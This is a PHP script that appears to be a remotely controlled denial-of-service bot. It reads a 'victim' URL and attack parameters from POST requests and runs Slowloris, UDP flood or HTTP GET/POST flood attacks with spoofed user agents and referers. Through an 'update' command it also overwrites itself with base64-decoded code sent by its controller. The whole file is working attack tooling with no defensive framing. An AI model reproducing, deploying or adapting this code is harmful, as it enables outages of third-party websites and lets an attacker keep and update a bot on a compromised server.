<?php 
//*setting php variable*//
set_time_limit(0);
/*auto update bot*/
function updateBot($data){
	$file=substr($_SERVER['PHP_SELF'],1,strlen($_SERVER['PHP_SELF']));
	 $f=fopen($file,"w");
	 @fwrite($f,base64_decode($data));
	 fclose($f);
}
/*config header*/
function initial($method){
$user=array("Mozilla/5.0 (Windows NT 6.1; rv:27.0) Gecko/20100101 Firefox/27.0",
			"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0",
			"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20130331 Firefox/21.0",
			"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20100101 Firefox/21.0",
			"Mozilla/5.0 (X11; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0",
			"Mozilla/5.0 (Windows NT 6.2; rv:21.0) Gecko/20130326 Firefox/21.0",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130401 Firefox/21.0",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130331 Firefox/21.0",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130330 Firefox/21.0",
			"Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
			"Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00",
			"Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00",
			"Opera/12.0(Windows NT 5.1;U;en)Presto/22.9.168 Version/12.00",
			"Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/14.0 Opera/12.0",
			"Opera/9.80 (X11; Linux i686; U; ja) Presto/2.7.62 Version/11.01",
			"Opera/9.80 (X11; Linux i686; U; fr) Presto/2.7.62 Version/11.01",
			"Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.7.62 Version/11.01",
			"Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.7.62 Version/11.01",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1623.0 Safari/537.36",
			"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.62 Safari/537.36",
			"Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36",
			"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.2 Safari/537.36",
			"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36",
			"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1467.0 Safari/537.36");
		//** header send to victim
$headers=array("http://www.nhaccuatui.com/bai-hat/em-cua-ngay-hom-qua-english-version-hoang-minh-tuan.lArPVRPJG6dW.html",
			   "http://www.haivl.com/",
			   "https://www.google.com.vn/?gfe_rd=ctrl&ei=mqQMU-qRO-yK8Qf1yYDgDw&gws_rd=cr",
			   "http://zing.vn","https://youtube.com","https://facebook.com","https//me.zing.vn","http://chatvl.com",
			   "https://gmail.com");  	   
		$x=rand(0,count($user));if($x>=0&&$x<count($user)){	$user=$user[$x]; } else { $user=$user[0]; }
		$y=rand(0,count($headers));if($x>=0&&$y<count($headers)){	$headers=$headers[$y]; }	else { $headers=$headers[0]; }		   
		$header  ="";			   
		$header .= "User-Agent: ".$user."\r\n";
		$header .= "Referer: ".$headers."\r\n";
		$header .= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";
		$header .= "Accept-Language: en-gb,en;q=0.5\r\n";
		$header .= "Accept-Encoding: gzip, deflate\r\n";
		return $header;
		}
function fPost($url,$port,$data,$timeout)
{
	$header=initial(1);  
	if(strpos($url,"http://")===false)
	{
		$url=$url;
	} 
	else 
	{  
		$url= substr($url ,strlen("http://"));
	} 
	$host=strstr($url,"/",true); 
	$urlpost=substr($url,strpos($url,"/"),strlen($url));
	$POST    = "POST /$urlpost HTTP/1.1\r\n"; 
	$POST 	.= "Host: $host\r\n";
	$header .= "Content-Type: application/x-www-form-urlencoded\r\n";
	$header .= "Content-Length: ".strlen($data)."\r\n";
	$header .= "Connection: 900\r\n\r\n";
	$header .= "$data"; 
	$header  =$POST.$header;  
	$close=time()+$timeout; 
	if(strpos($host,":")===false)
	{
		$host=$host;$port=80;
	} 
	else 
	{
		$port=substr($host,strpos($host,":")+1,strlen($host));
		$host=strstr($host,":",true);
	}  
	while(true) 
	{
		$s=@fsockopen($host,$port,$error,$desc,$timeout);
		if($s)
		{ 
			@fwrite($s,$header); 
			fclose($s); 		
		} 
		else 
		{
			continue;
		}
		if($close<=time()) 
		{ 
				break; 
		}
	} 
}
function fGet($url,$port,$timeout)
{
	$header=initial(0);  
	if(strpos($url,"http://")===false)
	{
		$url=$url;
	} 
	else 
	{  
		$url= substr($url ,strlen("http://"));
	} 
	$host=strstr($url,"/",true); 
	$urlpost=substr($url,strpos($url,"/"),strlen($url));
	$POST  	  = "GET /$urlpost HTTP/1.1\r\n"; 
	$POST 	 .= "Host: $host\r\n";
	$header  .= "Content-Length: " . rand(10000, 1000000) . "\r\n";
	$header  .= "Connection: 900\r\n\r\n"; 
	$header   =$POST.$header;  
	$close=time()+$timeout;
	if(strpos($host,":")===false)
	{
		$host=$host;$port=80;
	} 
	else 
	{
		$port=substr($host,strpos($host,":")+1,strlen($host));
		$host=strstr($host,":",true);
	}    
	while(true) 
	{
		$s=@fsockopen($host,$port,$error,$desc,$timeout);
		if($s)
		{ 
			@fwrite($s,$header); 
			fclose($s); 		
		} 
		else 
		{
			continue;
		}
		if($close<=time()) 
		{ 
				break; 
		}
	}  
}
function Slowloris($url,$port,$data,$method,$timeout)
{
	if(strpos($url,"http://")===false){
	$url=$url;
	} else {  
	$url= substr($url ,strlen("http://"));
	} 
	$host=strstr($url,"/",true); 
	$urlpost=substr($url,strpos($url,"/"),strlen($url));
	$maxtime=time()+$timeout;
	if($method=="GET")
	{
		$header   = "GET /$urlpost HTTP/1.1\r\n";
		$header  .= "Host: $host HTTP/1.1\r\n";
		$header  .= initial(0);
		$header  .= "Content-Length: " . rand(10000, 1000000) . "\r\n";
		$header  .= "Connection: 900\r\n"; 
		$header  .= "X-a: " . rand(1, 10000) . "\r\n"; 
		if(strpos(":",$host)===false)
		{
			$host=$host;$port=80;
		} else 
		{ 	
			$hosts=explode(":",$host);
			$host=$hosts[0];
			$port=$hosts[1];			
		} 
		$slowloris="X-c: ".rand(10000,100000)."\r\n";
		$s=@fsockopen($host,$port,$error,$desc);
		@fwrite($s,$header);
		while(true)
		{
			if(@fwrite($s,$slowloris)) 
				{
					sleep(15);
				}
			else 
				{
					$s=@fsockopen($host,$port,$error,$desc);
					@fwrite($s,$header);
				}
			if(time()>$maxtime)	
			{
				break;
			}
		}
		echo $header.$slowloris;
	}  
	else 
	{
		$header  ="POST /$urlpost HTTP/1.1\r\n";
		$header .="Host: $host \r\n";
		$header .=initial(1);
	    $header .="Content-Length: 1000000000\r\n"; 
		$header .="Content-Type: application/x-www-form-urlencoded\r\n";
		$header .= "Connection: 900\r\n"; 
		if(strpos(":",$host)===false)
		{
			$host=$host;$port=80;
		} else 
		{ 	
			$hosts=explode(":",$host);
			$host=$hosts[0];
			$port=$hosts[1];			
		} 
		$s=@fsockopen($host,$port,$error,$desc);
		@fwrite($s,$header);
		while(true)
		{
			if(@fwrite($s,".")) 
			{
				sleep(1);
			}
			else 
			{
				$s=@fsockopen($host,$port,$error,$desc);
				@fwrite($s,$header);
			}
			if(time()>$maxtime)	
			{
				break;
			}
		} 
	}  	
} 
function fUDP($url,$ports,$timeout)
{
	$ip=gethostbyname($url);
	$end=time();$portx="";
	$ports=explode(",",$ports);	
	$close=$end+$timeout;$data="";
	$x=rand(10000,50000);while($x<0) {$data.="x";$x--;}
	while(true) 
	{
		$s=@fsockopen("UDP://$ip",$ports[rand(0,count($ports))],$error,$desc,$timeout); 
		if($s)
		{
			@fwrite($s,$data);
			fclose($s);
		}
		if(time()>$close) 
		{ 
		break;
		}	 
	}
	echo "Success!!";
} 
	
$url=@$_POST["victim"];
$port=@$_POST["port"];
$data=base64_decode(@$_POST["data"]);
$method=@$_POST["method"];
$timeout=@$_POST["timeout"];
$tranfer=@$_POST["tranfer"];
switch($method){
	case "update": updateBot($data);break;
	case "Slowloris": Slowloris($url,$port,$data,$tranfer,$timeout); break;
	case "UDP Flood": fUDP($url,$port,$timeout); break;
	case "Data Flood": 
	{ 
	    if($tranfer=="POST") 
		{ 
			fPost($url,$port,$data,$timeout); 
		} 
		else 
		{ 
			fGet($url,$port,$timeout); 
		} 
		break; 
	}
default : die("undefined Assassin");
}	
//fGet($url,$port,$data,$timeout);
//fPost($url,$port,$data,$timeout);
?>